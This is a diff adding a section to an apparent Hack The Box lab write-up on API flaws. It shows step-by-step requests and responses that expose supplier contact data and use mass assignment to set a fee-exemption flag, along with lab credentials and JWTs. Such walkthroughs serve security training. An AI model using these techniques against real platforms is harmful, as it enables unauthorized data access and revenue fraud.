@@ -10,6 +10,9 @@ This document outlines common techniques for identifying and exploiting **API re
   - [Overview](#overview)
   - [Broken Object Level Authorization (BOLA)](#broken-object-level-authorization-bola)
   - [Broken Authentication](#broken-authentication)
+  - [Broken Object Property Level Authorization](#broken-object-property-level-authorization)
+    - [Excessive Data Exposure](#excessive-data-exposure)
+    - [Mass Assignment](#mass-assignment)
 
 ---
 
@@ -491,5 +494,214 @@ Response:
 ```
 
 This vulnerability chain demonstrates how weak password policies, missing rate limiting, and brute-forceable OTP mechanisms can be combined to achieve full account takeover. An attacker can reset arbitrary user passwords and gain unauthorized access to sensitive personal and financial data.
+
+For a deeper explanation of **broken authentication**, check out the `broken-authentication.md` document in the `broken-authentication` directory.
+
+---
+
+## Broken Object Property Level Authorization
+
+**Broken Object Property Level Authorization** vulnerabilities occur when an API exposes or allows modification of object properties beyond a user’s authorized scope. This category includes two primary subclasses:
+
+- Excessive Data Exposure
+- Mass Assignment
+
+An API endpoint is vulnerable to **Excessive Data Exposure** when it reveals sensitive object properties to **authorized users** who should not have access to that data.
+
+An API endpoint is vulnerable to **Mass Assignment** when it allows **authorized users** to modify object properties that should be immutable or restricted.
+
+### Excessive Data Exposure
+
+The target is vulnerable to [CWE-213, Exposure of Sensitive Information Due to Incompatible Policies](https://cwe.mitre.org/data/definitions/213.html).
+
+A brief description of this weakness is provided below:
+
+```
+The product's intended functionality exposes information to certain actors in accordance with the developer's security policy, but this information is regarded as sensitive according to the intended security policies of other stakeholders such as the product's administrator, users, or others whose information is being processed.
+```
+
+We are provided with valid credentials:
+
+```
+htbpentester4@hackthebox.com:HTBPentester4
+```
+
+Authentication is performed via the `/api/v1/authentication/customers/sign-in` endpoint to obtain a valid JSON Web Token (JWT):
+
+```
+{
+  "Email": "htbpentester4@hackthebox.com",
+  "Password": "HTBPentester4"
+}
+```
+
+![Filtered output](images/data-exposure.PNG)
+
+The server responds with a valid JWT:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjRAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiXSwiZXhwIjoxNzY4MDM5NjE3LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.-ipwwlk6ejD5mxlJRHKGnj-XCMfKFey3h9yvpePaqqy5AKMfsoAyJOlPFBl_FCg_GwAeSLa0P2AOXsVy9WGECA"
+}
+```
+
+The JWT is supplied using the `Authorize` functionality:
+
+![Filtered output](images/data-exposure2.PNG)
+
+Querying the `/api/v1/roles/current-user` endpoint reveals that the authenticated user has been assigned the following roles:
+
+- `Suppliers_Get`
+- `Suppliers_GetAll`
+
+![Filtered output](images/data-exposure3.PNG)
+
+Invoking the `/api/v1/suppliers` **GET** endpoint returns a list of suppliers that includes sensitive properties such as:
+
+- `id`
+- `companyID`
+- `name`
+- `email`
+- `phoneNumber`
+
+![Filtered output](images/data-exposure4.PNG)
+
+While allowing customers to view supplier listings is typical for e-commerce platforms, exposing **direct contact information** such as email addresses and phone numbers is inappropriate. This information enables customers to bypass the marketplace entirely by contacting suppliers directly, undermining the platform’s business model.
+
+This behavior demonstrates a clear case of **excessive data exposure**, where sensitive fields are unnecessarily returned to authorized users.
+
+### Mass Assignment
+
+The target is vulnerable to [CWE-915, Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html). 
+
+A brief description of the weakness is shown below:
+
+```
+The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.
+```
+
+We are provided with valid supplier credentials:
+
+```
+htbpentester6@pentestercompany.com:HTBPentester6
+```
+
+Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:
+
+```
+{
+  "Email": "htbpentester6@pentestercompany.com",
+  "Password": "HTBPentester6"
+}
+```
+
+The server responds with a valid JWT:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjZAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfVXBkYXRlIiwiU3VwcGxpZXJDb21wYW5pZXNfR2V0Il0sImV4cCI6MTc2ODA0MTU0MSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.FQ6madAV-SDGm0msFnZ4DGaAFuqgfM3UxQo-fOnCbVM4Nj0grPSmiBf7iYCXj6Ap0hRgytB3EU8qZ8Yh_ktvIw"
+}
+```
+
+After authorizing with the JWT, querying `/api/v1/roles/current-user` shows that the authenticated user has the following roles:
+
+- `SupplierCompanies_Update`
+- `SupplierCompanies_Get`
+
+![Filtered output](images/mass-assignment.PNG)
+
+The `/api/v1/supplier-companies/current-user` endpoint reveals that the supplier company associated with the authenticated user (`PentesterCompany`) has the following property set:
+
+```json
+"isExemptedFromMarketplaceFee": 0
+```
+
+![Filtered output](images/mass-assignment2.PNG)
+
+This indicates that the supplier company is subject to marketplace fees on each sale.
+
+Examining the `/api/v1/supplier-companies` **PATCH** endpoint reveals that it accepts user-controlled input for the `IsExemptedFromMarketplaceFee` field:
+
+ ```json
+ {
+  "UpdatedSupplierCompany": {
+    "SupplierCompanyID": "string",
+    "IsExemptedFromMarketplaceFee": 1,
+    "CertificateOfIncorporationPDFFileURI": "string"
+  }
+}
+ ```
+
+ ![Filtered output](images/mass-assignment3.PNG)
+
+An initial request fails due to missing required fields:
+
+  ```json
+{
+  "StatusCode": 400,
+  "Message": "One or more errors occurred!",
+  "Errors": {
+    "UpdatedSupplierCompany.SupplierCompanyID": [
+      "The JSON value is not in a supported Guid format."
+    ]
+  }
+}
+ ```
+
+We must provide a value for the `SupplierCompanyID` and `CertificateOfIncorporationPDFFileURI`. The required values can be obtained from the `/api/v1/supplier-companies/current-user` endpoint:
+
+ ```json
+ {
+  "supplierCompany": {
+    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
+    "name": "PentesterCompany",
+    "email": "supplier@pentestercompany.com",
+    "isExemptedFromMarketplaceFee": 0,
+    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
+  }
+}
+ ```
+
+Using this information, we resend the **PATCH** request with all required fields populated:
+
+ ```json
+ {
+  "UpdatedSupplierCompany": {
+    "SupplierCompanyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
+    "IsExemptedFromMarketplaceFee": 1,
+    "CertificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
+  }
+}
+ ```
+
+The server responds successfully:
+
+ ```json
+ {
+  "successStatus": true
+}
+ ```
+
+![Filtered output](images/mass-assignment4.PNG)
+
+Revisiting the `/api/v1/supplier-companies/current-user` endpoint confirms that the value has been updated:
+
+```json
+{
+  "supplierCompany": {
+    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
+    "name": "PentesterCompany",
+    "email": "supplier@pentestercompany.com",
+    "isExemptedFromMarketplaceFee": 1,
+    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
+  }
+}
+```
+
+![Filtered output](images/mass-assignment5.PNG)
+
+This confirms that the authenticated supplier was able to modify a **business-critical property** that should not be user-controllable.
+
+The endpoint fails to enforce proper property-level authorization, allowing suppliers to exempt themselves from marketplace fees. This **mass assignment vulnerability** directly impacts platform revenue and demonstrates inadequate server-side validation of modifiable object attributes.
 
 ---
